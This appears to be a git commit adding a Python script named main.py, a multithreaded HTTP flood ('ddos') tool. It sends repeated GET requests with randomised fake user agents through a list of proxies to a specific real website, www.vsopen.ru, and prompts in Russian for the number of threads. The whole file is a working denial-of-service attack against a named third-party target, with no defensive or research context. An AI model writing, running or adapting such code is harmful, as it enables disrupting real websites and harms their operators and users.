7423743164fa350cef7ce355a4cac9543ec1bc29
Art4N1ght <78933970+Art4N1ght@users.noreply.github.com>
2021-02-12 15:29:24 +0300

    Initial commit

---
+++ main.py
@@ -0,0 +1,38 @@
+import requests 
+import threading
+import fake_useragent
+
+from colorama import init, Fore, Back, Style
+
+while 1: 
+	try: 
+		threads_count = int(input('Потоки: '))
+		break
+	except: pass
+
+
+proxy_dict = {'http' : '0.0.0.0'}
+init(convert=True)
+
+info = Fore.BLUE + 'INFO' + Fore.WHITE
+f = open('proxy.txt', 'r').readlines()
+def ddos():
+	for i in range(20):
+		user = fake_useragent.UserAgent().random
+		header = {'user-agent': user}
+		for proxy in f:
+			
+			proxy_dict['http'] = 'http://'+proxy
+
+			try: 
+				request = requests.get('http://www.vsopen.ru/', proxies = proxy_dict, headers = header, timeout = 4)
+				print(f'[{info}] {Fore.GREEN + proxy + Fore.WHITE}\n')
+			except: print(f'[{info}] {Fore.RED + proxy + Fore.WHITE}\n')
+
+
+threads = []
+for i in range(threads_count):
+	t = threading.Thread(target=ddos, args=())
+	threads.append(t)
+	t.start()
+	print(f'Поток {i}/{threads_count} запущен')
